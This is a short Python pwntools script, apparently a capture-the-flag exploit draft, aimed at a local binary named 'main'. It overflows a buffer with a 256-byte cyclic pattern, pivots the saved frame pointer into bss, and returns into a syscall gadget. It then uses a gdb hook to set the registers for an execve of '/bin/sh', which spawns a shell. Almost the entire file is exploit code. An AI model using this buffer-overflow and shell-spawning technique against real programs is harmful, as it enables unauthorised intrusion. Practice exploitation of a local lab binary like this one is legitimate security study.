from pwn import *


elf = context.binary = ELF("./main")
p = process()


syscall = 0x000000000040117c
read = 0x00000000004011a2
read_plt = 0x401050
leave_ret = 0x00000000004011c0


# b *0x00000000004011c1
gdb.attach(p,f"""
b *0x40117c
c
set $rax=0x3b
set $rsi=0
set $rdx=0
set $rdi=0x404498
set {{char[8]}} 0x404498 = "/bin/sh"
set $rbx = 0
set $rcx = 0
set $r8 = 0 
set $r9 = 0 
set $r10 = 0
set $r11 = 0
set $r12 = 0
set $r13 = 0
set $r14 = 0x68732f6e69622f
set $r15 = 0
set $rbp = 0
set $rsp = 0
""")
p.send(cyclic(256) + p64(elf.bss(0x500)) + p64(syscall))



p.interactive()


   
   
   
   
   
   
   
   
   